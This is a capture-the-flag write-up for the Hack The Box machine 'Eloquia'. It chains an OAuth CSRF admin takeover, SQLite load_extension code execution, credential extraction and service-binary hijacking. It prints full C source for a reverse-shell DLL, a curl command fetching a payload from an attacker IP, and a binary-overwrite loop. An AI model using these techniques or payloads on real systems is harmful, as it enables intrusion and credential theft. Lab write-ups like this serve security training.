# HTB Eloquia — Writeup

## Hosts Configuration

Add the following entries to `/etc/hosts`:

```
10.10.11.99 eloquia.htb qooqle.htb
```

---

## Initial Access — OAuth CSRF Admin Takeover

### Vulnerability Overview

- **Issue**: OAuth 2.0 implementation missing `state` parameter
- **Impact**: CSRF allowing OAuth account linking
- **Result**: Admin account takeover without password

---

### Attack Flow Summary

1. Attacker logs into their own **Qooqle** account
2. OAuth flow is initiated without state validation
3. A malicious OAuth callback URL is generated
4. Admin visits the crafted URL while logged into **Eloquia**
5. Attacker’s Qooqle account is linked to the admin Eloquia account
6. Attacker logs in as admin via OAuth SSO

---

### Exploit Execution

Run the following exploit script to generate the malicious OAuth CSRF URL:

```bash
python3 oauth_csrf_admin_takeover.py
```

> The script logs into the attacker’s Qooqle account, generates the OAuth callback,
> and outputs a **malicious CSRF URL** to be delivered to an admin user.

---

### Admin Credentials Obtained

```text
Username: admin
Password: MyEl0qu!@Admin
```

---

## Admin Panel Exploitation

### Step 1: Upload Malicious DLL

- Access the admin panel
- Upload a malicious DLL via the **article banner upload** feature

---

### Step 2: SQLite Extension Execution

Create a query at:

```
http://eloquia.htb/accounts/admin/explorer/query
```

Execute:

```sql
SELECT load_extension('static/assets/images/blog/exploit.dll');
```

Click **“View on site”**, which triggers a URL similar to:

```
http://eloquia.htb/accounts/admin/r/9/X/
```

➡️ Results in **WEB access execution context**

---

## Reverse Shell (DLL Payload)

Compile the following DLL and upload it as `exploit.dll`:

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

__declspec(dllexport) int sqlite3_extension_init(
    void* db,
    char **pzErrMsg,
    const void* pApi
){
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("YOUR_IP");
    sa.sin_port = htons(81);

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }

    return 0;
}
```

---

## Post-Exploitation — WinRM Access

After web access, credentials can be extracted from **Microsoft Edge**, yielding:

```text
Username: Olivia.kat
Password: S3cureP@sswdIGu3ss
```

Connect via WinRM:

```bash
evil-winrm -i 10.10.11.99 -u 'Olivia.kat' -p 'S3cureP@sswdIGu3ss'
```

---

## Privilege Escalation — Binary Hijacking

### Target Directory

```powershell
cd "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug"
```

---

### Payload Delivery

```powershell
curl http://10.10.16.129/revshell.exe -o z.exe
```

---

### Binary Overwrite Loop

```powershell
while ($true) {
    try {
        Copy-Item "./z.exe" "./Failure2Ban.exe" -Force -ErrorAction Stop
        Write-Host "[+] Overwrite successful"
        break
    } catch {
    }
}
```

Wait for the service to restart and execute the payload.

---

## Attack Path Summary

1. OAuth CSRF → Admin account takeover  
2. Admin panel access → DLL upload  
3. SQLite extension execution → Web RCE  
4. Credential extraction → WinRM access  
5. Binary hijacking → Privilege escalation  

---

## Key Vulnerabilities

- Missing OAuth `state` parameter
- CSRF in OAuth callback
- Arbitrary DLL upload
- SQLite `load_extension` enabled
- Insecure service binary permissions

---

## Tools Used

- Custom Python OAuth CSRF exploit
- evil-winrm
- curl
- SQLite
- Custom DLL reverse shell

**Difficulty**: Hard  
**Impact**: Full system compromise
